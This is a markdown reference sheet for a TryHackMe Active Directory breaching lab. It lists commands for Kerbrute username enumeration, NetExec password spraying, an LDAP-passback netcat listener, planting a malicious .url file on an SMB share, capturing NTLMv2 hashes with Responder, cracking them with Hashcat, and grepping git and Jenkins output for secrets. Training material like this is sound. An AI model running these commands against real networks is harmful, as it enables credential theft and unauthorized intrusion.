# 🛠️ Active Directory Breaching — Tools

> **Topic:** Introduction to AD Breaching
>
> **Purpose:** Central reference for tools used throughout this topic.

---

# 🧰 Tool Summary

| Tool | Category | Main Purpose |
|---|---|---|
| **Kerbrute** | Kerberos / Enumeration | Enumerate valid AD usernames |
| **nslookup** | DNS Enumeration | Identify Domain Controllers, KDCs, and mail servers |
| **Git** | Version Control | Inspect repository history for exposed credentials |
| **TruffleHog** | Secret Scanning | Search repositories and history for secrets |
| **Jenkins** | CI/CD Platform | Investigate build logs, job configuration, and workspaces for exposed credentials |
| **NetExec (`nxc`)** | Network / Authentication Testing | Query password policy, verify credentials, and perform password spraying |
| **Netcat (`nc`)** | Network Utility | Create a listener for the LDAP passback lab |
| **smbclient** | SMB Client | Connect to SMB shares and upload the coercion file |
| **Responder** | Credential Capture | Capture NTLMv2 authentication material |
| **Hashcat** | Password Cracking | Crack Net-NTLMv2 hashes offline |
| **curl** | HTTP Client | Retrieve Jenkins build-console output |

---

# 1️⃣ Kerbrute

## Purpose

Used to validate potential usernames against an Active Directory domain through Kerberos.

## Username Enumeration

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt
```

## Save Results

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt -o valid_users.txt
```

---

# 2️⃣ nslookup

## Purpose

Used for DNS enumeration.

## Domain Controllers

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100
```

## Kerberos KDC

```bash
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100
```

## Mail Servers

```bash
nslookup -type=MX thm.loc 192.168.12.100
```

---

# 3️⃣ Git

## Purpose

Used to inspect repository history for exposed credentials.

```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
```

Important areas:

```text
Commit history
Configuration files
Hardcoded secrets
CI/CD definitions
```

---

# 4️⃣ TruffleHog

## Purpose

Used to search repositories and their history for secrets.

```bash
trufflehog git file:///path/to/repo
```

---

# 5️⃣ Jenkins

Jenkins is a CI/CD platform and can become a credential-discovery target.

Potential locations:

```text
Build console output
Job configuration
Environment variables
Workspace files
```

## Example

```bash
curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
```

---

# 6️⃣ NetExec

## Purpose

Used for network authentication testing.

This topic uses it for:

- Password-policy enumeration
- SMB authentication
- Password spraying
- Credential verification

## Query Password Policy

```bash
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```

## Password Spraying

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
```

## Password Spraying with Jitter

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success --jitter 2-5
```

## Verify Credentials

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```

### Important Results

```text
[+]
```

Successful authentication.

```text
STATUS_LOGON_FAILURE
```

Incorrect password.

```text
STATUS_ACCOUNT_DISABLED
```

Account exists but is disabled.

```text
STATUS_ACCOUNT_LOCKED_OUT
```

Account is locked.

```text
Pwn3d!
```

The account has local administrator privileges on the target.

---

# 7️⃣ Netcat

## Purpose

Used as a simple listener for the LDAP passback lab.

```bash
nc -lvnp 3489
```

---

# 8️⃣ smbclient

## Purpose

Used to access SMB shares and upload the malicious `.url` file.

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THMlice.moore%MegaCorp01!'
```

Upload:

```text
smb: \> put @Shortcut.url
```

Exit:

```text
smb: \> exit
```

---

# 9️⃣ Responder

## Purpose

Used to listen for authentication requests and capture NTLMv2 authentication material.

```bash
sudo responder -I tun0
```

Workflow:

```text
Malicious .url
      ↓
Writable SMB Share
      ↓
User Browses Share
      ↓
Windows Loads Icon
      ↓
SMB Authentication
      ↓
Responder
      ↓
NTLMv2 Hash
```

---

# 🔟 Hashcat

## Purpose

Used for offline password cracking.

## Net-NTLMv2

Hashcat mode:

```text
5600
```

Example:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

---

# 🔄 Complete Tool Workflow

```text
AD Breaching
     │
     ├── OSINT / Username Enumeration
     │       └── Kerbrute
     │
     ├── DNS Enumeration
     │       └── nslookup
     │
     ├── Credential Discovery
     │       ├── Git
     │       ├── TruffleHog
     │       └── Jenkins + curl
     │
     ├── Password Spraying
     │       └── NetExec
     │
     └── Authentication Coercion
             ├── Netcat
             ├── smbclient
             ├── Responder
             └── Hashcat
```

---

# 📊 Tool-to-Technique Mapping

| Technique | Tool(s) |
|---|---|
| Username Enumeration | Kerbrute |
| DNS Enumeration | nslookup |
| Git Credential Discovery | Git, TruffleHog |
| Jenkins Credential Discovery | Jenkins, curl |
| Password Policy Enumeration | NetExec |
| Password Spraying | NetExec |
| LDAP Passback | Netcat, NetExec |
| File-Based Coercion | smbclient, Responder |
| NTLMv2 Capture | Responder |
| NTLMv2 Cracking | Hashcat |

---

# 🧠 Quick Revision

```text
Kerbrute
→ Find valid usernames

nslookup
→ Find AD infrastructure

Git
→ Search repository history

TruffleHog
→ Search exposed secrets

Jenkins
→ Investigate CI/CD credential exposure

NetExec
→ Query policy + authenticate + spray

Netcat
→ Create a listener

smbclient
→ Access/upload to SMB shares

Responder
→ Capture NTLMv2 authentication

Hashcat
→ Crack captured Net-NTLMv2
```

---

# 📌 Lab Reminder

The commands, usernames, passwords, hashes, IP addresses, domain names, and URLs are preserved from the TryHackMe lab material.

Values such as:

```text
thm.loc
192.168.12.100
MegaCorp01!
admin:admin
```

are lab-specific values and should only be used in the intended authorized environment.

---

# 📚 Reference

- TryHackMe — Introduction to AD Breaching
